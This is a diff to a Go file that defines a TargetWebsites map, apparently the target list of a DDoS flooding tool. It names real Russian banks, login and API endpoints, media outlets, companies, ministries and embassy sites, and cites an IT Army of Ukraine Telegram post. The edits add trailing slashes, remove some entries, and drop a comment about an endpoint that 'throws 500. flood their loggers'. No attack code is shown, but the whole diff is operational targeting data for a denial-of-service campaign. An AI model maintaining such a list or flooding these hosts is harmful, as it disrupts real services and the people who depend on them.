@@ -52,7 +52,7 @@ var TargetWebsites = map[string]struct{}{
 	// 	"https://id.rambler.ru/login-20/login": {}, // TODO fix small read buffer
 	"https://mail.rambler.ru":                          {},
 	"https://news.rambler.ru":                          {},
-	"https://peroxide.rambler.ru/v1/comments/clusters": {},
+	"https://peroxide.rambler.ru/v1/comments/clusters/": {},
 	"https://rabota.rambler.ru":                        {},
 	"https://rcm.rambler.ru":                           {},
 	"https://mail.ru":                                  {},
@@ -89,7 +89,7 @@ var TargetWebsites = map[string]struct{}{
 	"https://news-front.info":                  {},
 	"https://novorosinform.org":                {},
 	"https://www.pravda.ru":                    {},
-	"https://www.pravda.ru/ajaxed/toolbartabs": {},
+	"https://www.pravda.ru/ajaxed/toolbartabs/": {},
 	"https://russia-insider.com/ru":            {},
 	"https://southfront.org":                   {},
 	"https://www.strategic-culture.org":        {},
@@ -100,8 +100,8 @@ var TargetWebsites = map[string]struct{}{
 	// Business corporations
 	"https://lukoil.ru":                                    {},
 	"https://magnit.ru":                                    {},
-	"https://www.evraz.com/ru":                             {},
-	"https://nlmk.com/ru":                                  {},
+	"https://www.evraz.com/ru/":                            {},
+	"https://nlmk.com/ru/":                                 {},
 	"https://www.sibur.ru":                                 {},
 	"https://www.severstal.com":                            {},
 	"https://www.eurosib.ru":                               {},
@@ -160,7 +160,7 @@ var TargetWebsites = map[string]struct{}{
 	"https://www.gazprombank.ru":                                     {},
 	"https://api.gazprombank.ru":                                     {},
 	"https://www.moex.com":                                           {},
-	"https://iss.moex.com/iss/reference":                             {},
+	"https://iss.moex.com/iss/reference/":                            {},
 	"https://messaging.moex.com/init":                                {},
 	"https://passport.moex.com/login":                                {},
 	"http://www.fsb.ru":                                              {},
@@ -180,7 +180,7 @@ var TargetWebsites = map[string]struct{}{
 	"https://online.vtb.ru":                                          {},
 	"https://online.gpb.ru/login":                                    {},
 	"https://alfabank.ru":                                            {},
-	"https://alfabank.ru/api/v1/geco-ip":                             {}, // throws 500. flood their loggers
+	"https://alfabank.ru/api/v1/geco-ip/":                            {},
 	"https://www.rshb.ru":                                            {},
 	"https://online.rshb.ru/b1/ib6/wf2/retail/ib/loginretaildefault": {},
 	"https://online.sovcombank.ru":                                   {},
@@ -235,7 +235,6 @@ var TargetWebsites = map[string]struct{}{
 	"http://crimea-post.ru":                       {},
 	"https://ca.vks.rosguard.gov.ru":              {},
 	"https://sozd.duma.gov.ru": {},
-	"https://minstroyrf.gov.ru/": {},
 	"https://wagnera.ru": {},
 
 	// Embassies
@@ -578,7 +577,7 @@ var TargetWebsites = map[string]struct{}{
 	"https://reestr.digital.gov.ru":   {},
 	"https://sc.digital.gov.ru/home":  {},
 	"https://minenergo.gov.ru":        {},
-	"https://minfin.gov.ru/ru":        {},
+	"https://minfin.gov.ru/ru/":        {},
 	"https://minjust.gov.ru":          {},
 	"https://www.minsport.gov.ru":     {},
 	"https://minstroyrf.gov.ru":       {},
@@ -594,8 +593,7 @@ var TargetWebsites = map[string]struct{}{
 	"https://m.avito.ru":      {},
 
 	// https://t.me/itarmyofukraine2022/269
-	"https://cdek.by/ru":            {},
-	"https://www.cdek.ru/ru":        {},
+	"https://cdek.by/ru/":            {},
 	"https://id.ds.cdek.ru":         {},
 	"https://lk.cdek.ru/user/login": {},
 	"https://www.cdek.ru/graphql":   {},
